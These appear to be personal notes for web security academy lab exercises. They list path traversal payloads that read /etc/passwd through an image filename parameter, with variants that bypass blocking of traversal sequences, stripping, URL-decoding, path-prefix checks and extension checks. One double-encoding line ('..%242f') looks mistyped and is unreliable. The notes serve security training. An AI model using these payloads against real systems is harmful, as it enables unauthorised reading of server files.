## LAB payloads
#### File path traversal, simple case
```
https://...web-security-academy.net/image?filename=46.jpg

https://...web-security-academy.net/image?filename=../../../../etc/passwd
```

#### File path traversal, traversal sequences blocked with absolute path bypass
```
/image?filename=/etc/passwd
```

#### File path traversal, traversal sequences stripped non-recursively
```
/image?filename=....//....//....//etc/passwd
```

#### File path traversal, traversal sequences stripped with superfluous URL-decode
- double encode ../../../
```
/image?filename=double_encoded(../../../)etc/passwd
```
or
```
..%242f..%242f..%242fetc/passwd
```

#### File path traversal, validation of start of path
```
/image?filename=/var/www/images/../../../etc/passwd
```

#### File path traversal, validation of file extension with null byte bypass
```
/image?filename=../../../etc/passwd%00.jpg
```